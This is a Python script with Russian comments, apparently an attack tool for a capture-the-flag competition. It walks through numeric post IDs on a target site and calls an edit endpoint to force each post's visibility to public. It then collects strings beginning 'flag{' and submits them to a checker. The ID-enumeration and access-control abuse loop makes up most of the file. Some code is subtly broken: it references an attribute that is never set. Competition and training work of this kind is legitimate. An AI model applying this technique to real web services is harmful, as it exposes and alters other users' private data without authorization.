from bs4 import BeautifulSoup
import time


ID_CHECK_DEPTH = 20 # сколько максимум несуществующих подряд аккаунтов попадают под цикл
MAX_ID_NUMBER = 10000 # максимальный ID


class FlagSniffer:
    def __init__(self, session, url, flags_file, headers,id_file, url_checker):
        self.session = session
        self.url = url
        self.flags_file = flags_file
        self.headers = headers
        self.id_file = id_file
        self.url_checker = url_checker


    def get_ids_from_last_id(self,last_id):
        for i in range(last_id, MAX_ID_NUMBER+1):
            yield i


    def sniff(self):

        f = open(self.flags_file, "r+")
        old_flags = {i.strip() for i in f.readlines()}
        
        new_flags = set()
       

        url_posts = self.url + "posts/edit/"    
        data = {"visibility": "public"}
        print("Начал проверять ID'шники...")
        do_not_exist_number = 0

        with open(self.id_file, 'r+') as lastIDFile: 
            last_id = int(lastIDFile.readline().strip()) + 1

        print(f"Начал с ID {last_id}")

        for id in self.get_ids_from_last_id(last_id):
            print(id)
            try:
                post_id_request = self.session.post(url_posts+str(id), data, headers=self.headers)
            except Exception:
                print(f"НЕ смог проверить ID {id}")

            if post_id_request.status_code == 200:
                # сбрасываем счетчик несуществующих ID
                do_not_exist_number = 0
                                
                # Парсим JSON ответ
                json_data = post_id_request.json()
                

                # Извлекаем контент из JSON
                content = json_data.get("post", {}).get("content", "")
                
                # Ищем флаг в формате flag{...}
                if content.startswith("flag{"):
                    # проверяем флаг
                    flag = self.check_flag(content)

                    if flag is not None:
                        print("Найден верный флаг!")
                        


                        new_flags.add(content)
                       
            else:
                do_not_exist_number += 1
                if do_not_exist_number >= ID_CHECK_DEPTH:
                    print(f"{ID_CHECK_DEPTH} подряд ID'шников не существуют, прекращаю поиск...")
                    break

            time.sleep(0.15)
            
        flags = new_flags.difference(old_flags)

        # Добавляем новые флаги в файл
        for i in flags:
            f.write(i+"\n")
        
        # добавляем этот ID как последний в файл
        with open(self.id_file,'w') as lastIDFile:
            lastIDFile.write(str(id)+'\n')

        f.close()
        flag_length = len(flags) 
        if flag_length > 0:
            print(f"Я нашел новые флаги! Их целых {flag_length} штук")        
        if flag_length == 0:
            print('Новых флагов не найдено 😭')
        return flags
    
    def check_flag(self,flag):
        url = self.path + flag
        print(f"Проверяю {flag}")
        if self.session.get(url).text.strip() == 'Верный флаг':
            return flag
        return None
    